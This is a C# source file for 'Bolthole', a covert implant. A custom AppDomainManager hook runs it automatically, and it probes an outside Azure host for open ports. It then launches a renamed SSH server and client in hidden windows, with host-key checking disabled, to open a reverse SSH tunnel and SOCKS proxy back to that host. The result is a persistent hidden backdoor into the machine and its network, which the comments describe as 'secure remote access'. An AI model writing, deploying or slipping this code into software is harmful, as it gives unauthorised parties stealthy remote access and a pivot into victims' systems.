/**
 * Bolthole Application
 * 
 * This application establishes a reverse SSH tunnel to a remote server.
 * It first checks for open ports on the target server and then creates
 * a secure connection for remote access purposes.
 */
using System;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Collections.Generic;

/// <summary>
/// Custom AppDomainManager that serves as the entry point for the application.
/// This class is loaded when the application domain is initialized and 
/// immediately triggers the main functionality.
/// </summary>
public sealed class BoltDomain : AppDomainManager
{
    /// <summary>
    /// Initializes a new application domain and starts the main application logic.
    /// </summary>
    /// <param name="appDomainInfo">Setup information for the application domain</param>
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        Boltout.Begin();
        return;
    }
}

/// <summary>
/// Main functionality class that handles port scanning and establishing 
/// SSH connections to the target server.
/// </summary>
public class Boltout
{
    /// <summary>
    /// Tests if a specific port is open on the target host.
    /// </summary>
    /// <param name="sshHost">The host to connect to</param>
    /// <param name="port">The port to check</param>
    /// <returns>
    /// The port number if connection was successful, or 
    /// the default port (1337) if connection failed
    /// </returns>
    public static int CheckPorts(string sshHost, int port)
    {
        // Define timeout in seconds for connection attempts
        var timeout = 100;
        var result = false;
        // Default return value when port is closed
        int noPort = 1337;

        using (var client = new TcpClient())
        {
            try
            {
                // Configure connection timeouts (convert seconds to milliseconds)
                client.ReceiveTimeout = timeout * 1000;
                client.SendTimeout = timeout * 1000;

                // Begin asynchronous connection attempt
                var asyncResult = client.BeginConnect(sshHost, port, null, null);
                var waitHandle = asyncResult.AsyncWaitHandle;
                try
                {
                    // Wait for the connection attempt to complete within timeout period
                    if (!asyncResult.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(timeout), false))
                    {
                        // Connection timed out, close the client
                        client.Close();
                    }
                    else
                    {
                        // Connection attempt completed - check if successful
                        result = client.Connected;
                        if (result == true)
                        {
                            // Port is open, return the port number
                            return port;
                        }
                        else
                        {
                            // Port is closed, return the default value
                            return noPort;
                        }
                    }
                    // Complete the connection process (cleanup)
                    client.EndConnect(asyncResult);
                }
                finally
                {
                    // Ensure wait handle is properly cleaned up
                    waitHandle.Close();
                }
            }
            catch
            {
                // Silently handle any connection exceptions
                // (returns default noPort value)
            }
        }

        return noPort;
    }


    /// <summary>
    /// Main method that initiates port scanning and establishes SSH connections.
    /// </summary>
    public static void Begin()
    {
        // Host to initiate reverse SSH tunnel files to. Replace with your server FQDN or IP.
        string sshHost = "clientnameboltserver.eastus2.cloudapp.azure.com";

        // Initialize port testing variables
        int portTest;

        // Define common ports to check for connectivity
        List<int> ports = new List<int>(2);
        ports.Add(22);    // SSH
        ports.Add(443);   // HTTPS
        ports.Add(80);    // HTTP
        ports.Add(31337); // Custom service port

        // Store list of ports that respond to connection attempts
        List<int> openPorts = new List<int>();

        // Test each port and collect results
        foreach (int p in ports)
        {
            // Call CheckPorts() and perform a connection test
            portTest = CheckPorts(sshHost, p);
            // Add the port result to our collection of open ports
            openPorts.Add(portTest);
        }

        // Attempt to establish SSH connections using discovered open ports
        try
        {
            // Predefined location for SSH files
            string userName = "clientnameuser";

            // Get the base directory of the application
            string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;

            // Combine the base directory with the relative path to the file
            string boltd = Path.Combine(baseDirectory, "BoltFiles", "boltd.exe");
            string boltHostKey = Path.Combine(baseDirectory, "BoltFiles", "bolt_key");
            string boltConfig = Path.Combine(baseDirectory, "BoltFiles", "boltd-config");
            string boltAllow = Path.Combine(baseDirectory, "BoltFiles", "authorized_keys");

            // Start the SSH server using the host RSA key
            Process boltdStart = new Process();
            boltdStart.StartInfo.FileName = boltd;
            boltdStart.StartInfo.Arguments = $"-h {boltHostKey} -f {boltConfig} -o AuthorizedKeysFile={boltAllow}";
            boltdStart.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            boltdStart.Start();

            // Establish reverse SSH tunnel to remote server
            // This creates tunnels for ports 9052 and 31337 back to the target machine
            Process boltConStart = new Process();
            string boltCon = Path.Combine(baseDirectory, "BoltFiles", "boltcon.exe");
            string boltKey = Path.Combine(baseDirectory, "BoltFiles", "clientnameuser_key");
            boltConStart.StartInfo.FileName = boltCon;
            boltConStart.StartInfo.Arguments = $"-o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o Compression=yes -o ForwardAgent=no -o TCPKeepAlive=yes -o ServerAliveCountMax=5 -o loglevel=ERROR -p {openPorts[0]} -i {boltKey} {userName}@{sshHost} -R 9052 -R 31332:127.0.0.1:31332 -N";
            boltConStart.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            boltConStart.Start();
            boltConStart.WaitForExit();

        }
        catch (Exception ex)
        {
            // Basic error handling - this could be expanded to provide more detailed diagnostics
            Console.WriteLine($"Error: {ex.Message}");
        }

    }
}

